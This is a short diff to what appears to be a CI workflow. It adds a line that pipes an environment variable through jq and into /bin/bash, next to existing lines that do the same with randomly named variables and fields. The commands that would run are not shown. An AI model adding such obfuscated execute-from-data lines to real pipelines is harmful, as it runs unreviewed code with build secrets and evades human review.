@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$u7" | jq -r .gsit42 | /bin/bash
           echo $ca26445 | jq -r .qrzzm56440 | /bin/bash
           echo $hzon2 | jq -r .ejcac8723 | /bin/bash
+          echo $e6 | jq -r .w22856 | /bin/bash
 
       - name: Persist results
         if: always()
